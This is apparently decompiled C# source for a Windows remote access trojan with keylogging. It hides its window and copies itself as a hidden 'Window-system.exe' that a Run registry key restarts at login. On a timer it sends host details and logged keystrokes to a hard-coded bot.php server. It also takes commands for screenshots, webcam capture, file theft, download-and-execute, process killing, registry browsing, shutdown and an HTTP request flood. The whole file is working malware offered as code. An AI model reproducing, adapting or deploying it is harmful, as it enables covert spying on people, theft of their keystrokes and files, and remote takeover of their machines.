using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace winsys;

public class Form1 : Form
{
	private Timer achain;

	private keylogg kiphan;

	private RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);

	private string latshi = Application.get_ExecutablePath().ToString();

	private string pyitmat = "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Window-system.exe";

	private string lange = "http://192.168.50.128:81/server/bot.php";

	private int ganum = 5;

	private string bautzarthone = "Mozilla/5.0 (Windows NT 6.0; U; ja; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.00";

	private string[] yalatmyar = new string[4];

	private string phanelan = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private string tatinpoechat;

	private int akyaine;

	private string taitmae;

	private WebClient wapthonemae = new WebClient();

	private IContainer components = null;

	public Form1()
	{
		louepyatmae();
		kiphan = new keylogg();
		yigasati();
		achainsatinmae();
		kiphan.hidd();
		lotemae();
		InitializeComponent();
		Application.Run();
		kiphan.UhWh();
	}

	private void lotemae()
	{
		wapthonemae.Headers["User-Agent"] = bautzarthone;
		wapthonemae.DownloadStringCompleted += wipyaetwarpyi;
	}

	private void wipyaetwarpyi(object sender, DownloadStringCompletedEventArgs e)
	{
		try
		{
			Uri address = new Uri(taitmae);
			if (akyaine > 0)
			{
				wapthonemae.Headers["User-Agent"] = bautzarthone;
				wapthonemae.DownloadStringAsync(address);
				akyaine--;
			}
		}
		catch
		{
		}
	}

	private void louepyatmae()
	{
		if (File.Exists(Application.get_StartupPath() + "\\log.txt"))
		{
			File.Delete(Application.get_StartupPath() + "\\log.txt");
		}
	}

	private void yigasati()
	{
		if (latshi == pyitmat)
		{
			reg.SetValue("Window-system", Application.get_ExecutablePath().ToString());
			return;
		}
		try
		{
			if (File.Exists(pyitmat))
			{
				File.Delete(pyitmat);
				File.Copy(Application.get_ExecutablePath(), pyitmat);
				File.SetAttributes(pyitmat, FileAttributes.Hidden);
				Process.Start(pyitmat);
			}
			else
			{
				File.Copy(Application.get_ExecutablePath(), pyitmat, overwrite: true);
				File.SetAttributes(pyitmat, FileAttributes.Hidden);
				Process.Start(pyitmat);
			}
		}
		catch
		{
		}
	}

	private void achainsatinmae()
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		try
		{
			achain = new Timer();
			achain.set_Interval(ganum * 1000);
			achain.add_Tick((EventHandler)achaintimae);
			achain.Start();
		}
		catch
		{
		}
	}

	private void achaintimae(object sender, EventArgs e)
	{
		//IL_009a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0155: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (File.Exists(Application.get_StartupPath() + "\\log.txt"))
			{
				FileStream stream = new FileStream(Application.get_StartupPath() + "\\log.txt", FileMode.Open, FileAccess.Read);
				string text;
				using (StreamReader streamReader = new StreamReader(stream, Encoding.UTF8))
				{
					text = streamReader.ReadToEnd();
				}
				string[] poeachatmyar = new string[14]
				{
					"mamalate",
					malatsryumae().ToString(),
					"dihaena",
					Environment.MachineName.ToString(),
					"adikanae",
					new ComputerInfo().get_OSFullName(),
					"pyaemae",
					mumae(),
					"oonoutko",
					oonoutyumae(),
					"kalotephammae",
					text,
					"tatinepoe",
					tatinpoechat
				};
				amayrkyipot(lange, poeachatmyar);
				tatinpoechat = string.Empty;
			}
			else
			{
				string[] poeachatmyar = new string[14]
				{
					"mamalate",
					malatsryumae().ToString(),
					"dihaena",
					Environment.MachineName.ToString(),
					"adikanae",
					new ComputerInfo().get_OSFullName(),
					"pyaemae",
					mumae(),
					"oonoutko",
					oonoutyumae(),
					"kalotephammae",
					"",
					"tatinepoe",
					tatinpoechat
				};
				amayrkyipot(lange, poeachatmyar);
				tatinpoechat = string.Empty;
			}
		}
		catch
		{
		}
	}

	private void amayrkyipot(string lankyaung, string[] poeachatmyar)
	{
		//IL_0289: Unknown result type (might be due to invalid IL or missing references)
		//IL_0290: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			for (int i = 0; i < poeachatmyar.Length; i += 2)
			{
				text += $"&{poeachatmyar[i]}={poeachatmyar[i + 1]}";
			}
			text = text.Remove(0, 1);
			byte[] bytes = aSCIIEncoding.GetBytes(text);
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(lankyaung);
			httpWebRequest.Method = "POST";
			httpWebRequest.ContentType = "application/x-www-form-urlencoded";
			httpWebRequest.ContentLength = bytes.Length;
			Stream requestStream = httpWebRequest.GetRequestStream();
			requestStream.Write(bytes, 0, bytes.Length);
			requestStream.Close();
			WebResponse response = httpWebRequest.GetResponse();
			requestStream = response.GetResponseStream();
			StreamReader streamReader = new StreamReader(requestStream);
			string text2 = streamReader.ReadToEnd();
			streamReader.Close();
			yalatmyar = text2.Split(new char[1] { '|' });
			switch (yalatmyar[0])
			{
			case "computer":
				switch (yalatmyar[1])
				{
				case "Restart":
				{
					ProcessStartInfo startInfo2 = new ProcessStartInfo("shutdown.exe", "-r");
					Process.Start(startInfo2);
					break;
				}
				case "Shutdown":
				{
					ProcessStartInfo startInfo = new ProcessStartInfo("shutdown.exe", "-s");
					Process.Start(startInfo);
					break;
				}
				}
				break;
			case "screenshot":
			{
				if (!(yalatmyar[1] == "Start"))
				{
					break;
				}
				Rectangle bounds = Screen.GetBounds(Point.Empty);
				Bitmap val = new Bitmap(bounds.Width, bounds.Height);
				try
				{
					Graphics val2 = Graphics.FromImage((Image)(object)val);
					try
					{
						val2.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
					}
					finally
					{
						((IDisposable)val2)?.Dispose();
					}
					((Image)val).Save(Application.get_StartupPath() + "\\image.jpg", ImageFormat.get_Jpeg());
					try
					{
						WebClient webClient3 = new WebClient();
						string fileName2 = Application.get_StartupPath() + "\\image.jpg";
						webClient3.Credentials = CredentialCache.DefaultCredentials;
						webClient3.UploadFile(lankyaung, "POST", fileName2);
						webClient3.Dispose();
						if (File.Exists(Application.get_StartupPath() + "\\image.jpg"))
						{
							File.Delete(Application.get_StartupPath() + "\\image.jpg");
						}
						break;
					}
					catch
					{
						break;
					}
				}
				finally
				{
					((IDisposable)val)?.Dispose();
				}
			}
			case "webcam":
				try
				{
					if (yalatmyar[1] == "Start")
					{
						webcam.CaptureSTA(Application.get_StartupPath() + "\\webcamimage.jpg");
					}
					WebClient webClient2 = new WebClient();
					string fileName = Application.get_StartupPath() + "\\webcamimage.jpg";
					webClient2.Credentials = CredentialCache.DefaultCredentials;
					webClient2.UploadFile(lankyaung, "POST", fileName);
					webClient2.Dispose();
					if (File.Exists(Application.get_StartupPath() + "\\webcamimage.jpg"))
					{
						File.Delete(Application.get_StartupPath() + "\\webcamimage.jpg");
					}
					break;
				}
				catch
				{
					break;
				}
			case "monitor":
				try
				{
					if (yalatmyar[1] == "Off")
					{
						SendMessage(((Control)this).get_Handle().ToInt32(), 274, 61808, 2);
					}
					else
					{
						SendMessage(((Control)this).get_Handle().ToInt32(), 274, 61808, -1);
					}
					break;
				}
				catch
				{
					break;
				}
			case "list":
				switch (yalatmyar[1])
				{
				case "devicesvolume":
					try
					{
						DriveInfo[] drives = DriveInfo.GetDrives();
						DriveInfo[] array2 = drives;
						foreach (DriveInfo driveInfo in array2)
						{
							tatinpoechat = tatinpoechat + driveInfo.ToString() + "{-d}";
						}
						string[] postdatas4 = new string[4]
						{
							"report",
							tatinpoechat,
							"macaddress",
							malatsryumae().ToString()
						};
						tikypaepot(lankyaung, postdatas4);
						break;
					}
					catch
					{
						string[] postdatas5 = new string[4]
						{
							"report",
							null,
							"macaddress",
							malatsryumae().ToString()
						};
						tikypaepot(lankyaung, postdatas5);
						break;
					}
				case "path":
					try
					{
						string[] directories = Directory.GetDirectories(yalatmyar[2] + "\\");
						string[] files = Directory.GetFiles(yalatmyar[2] + "\\");
						for (int i = 0; i < directories.Length; i++)
						{
							tatinpoechat = tatinpoechat + directories[i].Substring(directories[i].LastIndexOf("/") + 1) + "{-f}";
						}
						tatinpoechat += "{-fbr}";
						for (int i = 0; i < files.Length; i++)
						{
							FileInfo fileInfo = new FileInfo(files[i]);
							object obj3 = tatinpoechat;
							tatinpoechat = string.Concat(obj3, files[i].Substring(files[i].LastIndexOf("/") + 1), "{-fi}", fileInfo.Length.ToString(), "{-fi}", fileInfo.LastWriteTimeUtc, "{-f}");
						}
						tatinpoechat = tatinpoechat.Replace("\\", "\\\\");
						string[] postdatas2 = new string[4]
						{
							"report",
							tatinpoechat,
							"macaddress",
							malatsryumae().ToString()
						};
						tikypaepot(lankyaung, postdatas2);
						break;
					}
					catch
					{
						string[] postdatas3 = new string[4]
						{
							"report",
							null,
							"macaddress",
							malatsryumae().ToString()
						};
						tikypaepot(lankyaung, postdatas3);
						break;
					}
				case "upload":
					try
					{
						WebClient webClient = new WebClient();
						webClient.Credentials = CredentialCache.DefaultCredentials;
						webClient.UploadFile(lankyaung, "POST", yalatmyar[2]);
						webClient.Dispose();
						break;
					}
					catch
					{
						break;
					}
				case "download":
					try
					{
						WebClient webClient = new WebClient();
						webClient.Credentials = CredentialCache.DefaultCredentials;
						webClient.DownloadFile(yalatmyar[2], yalatmyar[3]);
						webClient.Dispose();
						break;
					}
					catch
					{
						tatinpoechat = "RF";
						break;
					}
				case "run":
					try
					{
						File.SetAttributes(yalatmyar[2], FileAttributes.Hidden);
						Process.Start(yalatmyar[2]);
						break;
					}
					catch
					{
						tatinpoechat = "RF";
						break;
					}
				case "newfolder":
					try
					{
						Directory.CreateDirectory(yalatmyar[2]);
						break;
					}
					catch
					{
						tatinpoechat = "RF";
						break;
					}
				}
				break;
			case "programs":
			{
				tatinpoechat = "LSprograms{-p}";
				string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall";
				using (RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey(name))
				{
					string[] array = registryKey2.GetSubKeyNames();
					foreach (string name2 in array)
					{
						using RegistryKey registryKey3 = registryKey2.OpenSubKey(name2);
						try
						{
							if (registryKey3.GetValue("InstallLocation") != null && registryKey3.GetValue("DisplayName") != null)
							{
								object obj3 = tatinpoechat;
								tatinpoechat = string.Concat(obj3, registryKey3.GetValue("DisplayName"), "{-pi}", registryKey3.GetValue("DisplayVersion"), "{-pi}", registryKey3.GetValue("Publisher"), "{-pi}", registryKey3.GetValue("UninstallString"), "{-p}");
							}
						}
						catch
						{
							tatinpoechat = "RFprograms";
						}
					}
				}
				if (tatinpoechat.Contains("\""))
				{
					tatinpoechat = tatinpoechat.Replace("\\", "\\\\");
				}
				string[] postdatas7 = new string[4]
				{
					"report",
					tatinpoechat,
					"macaddress",
					malatsryumae().ToString()
				};
				tikypaepot(lankyaung, postdatas7);
				break;
			}
			case "process":
			{
				string text4 = null;
				tatinpoechat = "LS{-p}";
				try
				{
					Process[] processes = Process.GetProcesses();
					Process[] array3 = processes;
					foreach (Process process in array3)
					{
						try
						{
							text4 = FileVersionInfo.GetVersionInfo(process.MainModule!.FileName).FileDescription;
						}
						catch
						{
							text4 = null;
						}
						object obj3 = tatinpoechat;
						tatinpoechat = string.Concat(obj3, process.ProcessName, "{-pi}", process.PrivateMemorySize, "{-pi}", text4, "{-p}");
					}
				}
				catch
				{
					tatinpoechat = "RF";
				}
				string[] postdatas6 = new string[4]
				{
					"report",
					tatinpoechat,
					"macaddress",
					malatsryumae().ToString()
				};
				tikypaepot(lankyaung, postdatas6);
				break;
			}
			case "processkill":
				try
				{
					Process[] processes = Process.GetProcesses();
					Process[] array3 = processes;
					foreach (Process process in array3)
					{
						if (process.ProcessName == yalatmyar[1])
						{
							process.Kill();
						}
					}
					break;
				}
				catch
				{
					break;
				}
			case "reglist":
			{
				tatinpoechat = "LSreglist{-l}";
				try
				{
					if (yalatmyar[1].Contains("//"))
					{
						yalatmyar[1] = yalatmyar[1].Replace("//", "\\");
					}
					string[] subKeyNames = Registry.CurrentUser.OpenSubKey(yalatmyar[1], writable: true)!.GetSubKeyNames();
					string[] array = subKeyNames;
					foreach (string text3 in array)
					{
						tatinpoechat = tatinpoechat + text3 + "{-l}";
					}
					tatinpoechat += "{-lf}";
					string[] valueNames = Registry.CurrentUser.OpenSubKey(yalatmyar[1], writable: true)!.GetValueNames();
					array = valueNames;
					foreach (string text3 in array)
					{
						RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(yalatmyar[1], writable: true);
						object obj3 = tatinpoechat;
						tatinpoechat = string.Concat(obj3, text3, "{-li}", registryKey.GetValue(text3), "{-l}");
					}
				}
				catch
				{
					tatinpoechat = "RF" + yalatmyar[0];
				}
				tatinpoechat = tatinpoechat.Replace("\\", "\\\\");
				string[] postdatas = new string[4]
				{
					"report",
					tatinpoechat,
					"macaddress",
					malatsryumae().ToString()
				};
				tikypaepot(lankyaung, postdatas);
				break;
			}
			case "sodt":
				try
				{
					taitmae = yalatmyar[1];
					Uri address = new Uri(yalatmyar[1]);
					akyaine = Convert.ToInt32(yalatmyar[2]);
					wapthonemae.Headers["User-Agent"] = bautzarthone;
					wapthonemae.DownloadStringAsync(address);
					break;
				}
				catch
				{
					break;
				}
			case "bointvt":
				try
				{
					achain.set_Interval(Convert.ToInt32(yalatmyar[1]));
					break;
				}
				catch
				{
					break;
				}
			case "":
				break;
			}
		}
		catch
		{
		}
	}

	private void tikypaepot(string url, string[] postdatas)
	{
		string text = string.Empty;
		try
		{
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			for (int i = 0; i < postdatas.Length; i += 2)
			{
				text += $"&{postdatas[i]}={postdatas[i + 1]}";
			}
			text = text.Remove(0, 1);
			byte[] bytes = aSCIIEncoding.GetBytes(text);
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(url);
			httpWebRequest.Method = "POST";
			httpWebRequest.ContentType = "application/x-www-form-urlencoded";
			httpWebRequest.ContentLength = bytes.Length;
			Stream requestStream = httpWebRequest.GetRequestStream();
			requestStream.Write(bytes, 0, bytes.Length);
			requestStream.Close();
		}
		catch
		{
		}
	}

	private string oonoutyumae()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Hardware\\Description\\System\\CentralProcessor\\0", RegistryKeyPermissionCheck.ReadSubTree);
			if (registryKey != null && registryKey.GetValue("ProcessorNameString") != null)
			{
				return registryKey.GetValue("ProcessorNameString")!.ToString();
			}
		}
		catch
		{
		}
		return null;
	}

	private string mumae()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			float num = new ComputerInfo().get_TotalPhysicalMemory();
			float num2 = num / 1024f;
			return num2 / 1024f + " MB";
		}
		catch
		{
			return null;
		}
	}

	private string malatsryumae()
	{
		try
		{
			NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
			foreach (NetworkInterface networkInterface in allNetworkInterfaces)
			{
				if (networkInterface.NetworkInterfaceType == NetworkInterfaceType.Ethernet && networkInterface.OperationalStatus == OperationalStatus.Up)
				{
					return networkInterface.GetPhysicalAddress().ToString();
				}
			}
		}
		catch
		{
		}
		return "no-nic";
	}

	[DllImport("user32.dll", SetLastError = true)]
	private static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetAsyncKeyState(long vKey);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetAnyncKeySync(long vKey);

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
	}

	private void Form1_FormClosed(object sender, FormClosedEventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0081: Unknown result type (might be due to invalid IL or missing references)
		//IL_008b: Expected O, but got Unknown
		//IL_0093: Unknown result type (might be due to invalid IL or missing references)
		//IL_009d: Expected O, but got Unknown
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(116, 73));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Form1");
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_FormClosed(new FormClosedEventHandler(Form1_FormClosed));
		((Control)this).ResumeLayout(false);
	}
}
